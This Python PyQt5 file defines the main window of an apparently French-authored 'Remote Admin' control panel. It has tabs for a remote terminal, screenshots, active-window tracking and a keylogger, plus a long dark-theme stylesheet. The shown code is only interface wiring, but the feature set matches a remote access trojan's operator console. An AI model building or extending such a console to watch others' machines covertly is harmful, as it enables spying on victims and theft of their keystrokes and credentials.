from PyQt5.QtWidgets import QMainWindow, QTabWidget
from ui.terminal_tab import TerminalTab
from ui.screenshot_tab import ScreenshotTab
from ui.connection_tab import ConnectionTab
from ui.window_tracker import WindowTrackerTab
from ui.keylogger_tab import KeyloggerTab

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()

        self.setWindowTitle("Command Center - Remote Admin")
        self.setGeometry(100, 100, 800, 500)

        self.tabs = QTabWidget()
        self.setCentralWidget(self.tabs)

        self.connection_tab = ConnectionTab()
        self.terminal_tab = TerminalTab(self.connection_tab)
        self.screenshot_tab = ScreenshotTab(self.connection_tab)
        self.window_tracker_tab = WindowTrackerTab(self.connection_tab) 
        self.keylogger_tab = KeyloggerTab(self.connection_tab) # Nouvel onglet

        self.tabs.addTab(self.connection_tab, "🔌 Connexion")
        self.tabs.addTab(self.terminal_tab, "🖥 Terminal")
        self.tabs.addTab(self.screenshot_tab, "📸 Screenshot")
        self.tabs.addTab(self.window_tracker_tab, "🪟 Fenêtre active")
        self.tabs.addTab(self.keylogger_tab, "⌨ Keylogger")  # Ajout du nouvel onglet

        self.apply_style()

    def apply_style(self):
        self.setStyleSheet("""
            QMainWindow {
                background-color: #0F172A;
                color: #E2E8F0;
            }

            QTabWidget::pane {
                border: 2px solid #1E293B;
                background: #1E293B;
                border-radius: 12px;
            }

            QTabBar::tab {
                background: #1E40AF;
                padding: 10px;
                margin: 5px;
                color: #E2E8F0;
                border-radius: 20px;
                font-size: 14px;
                width: 150px;
            }

            QTabBar::tab:selected {
                background: #3B82F6;
                font-weight: bold;
                color: white;
            }

            QTabBar::tab:hover {
                background: #2563EB;
                color: #F8FAFC;
            }

            QTextEdit, QLineEdit {
                background-color: #0F172A;
                border: 2px solid #334155;
                color: #E2E8F0;
                border-radius: 8px;
                padding: 6px;
            }

            QComboBox {
                background-color: #0F172A;
                border: 2px solid #334155;
                color: #E2E8F0;
                border-radius: 8px;
                padding: 6px;
            }

            QComboBox::drop-down {
                border: none;
                background: transparent;
                width: 16px;  /* Ajuste la taille si nécessaire */
            }

            QComboBox QAbstractItemView {
                background-color: #1E293B;
                color: #fff;
                border: 2px solid #334155;
                selection-background-color: #2563EB;
                selection-color: white;
                border-radius: 8px;
            }

            QComboBox QAbstractItemView::item:hover {
                background: #3B82F6;
                color: white;
            }

            QPushButton {
                background-color: #1E40AF;
                color: white;
                padding: 10px 15px;
                border-radius: 12px;
                font-size: 14px;
                border: none;
            }

            QPushButton:hover {
                background-color: #2563EB;
            }

            QPushButton:pressed {
                background-color: #1D4ED8;
            }

            QLabel {
                font-size: 14px;
                font-weight: bold;
                color: #E2E8F0;
            }

            QGroupBox {
                background-color: #1E293B;
                border: 2px solid #334155;
                border-radius: 12px;
                padding: 10px;
                margin-top: 10px;
            }

            QGroupBox::title {
                subcontrol-origin: margin;
                subcontrol-position: top center;
                padding: 5px;
                font-size: 14px;
                font-weight: bold;
                color: #3B82F6;
            }
        """)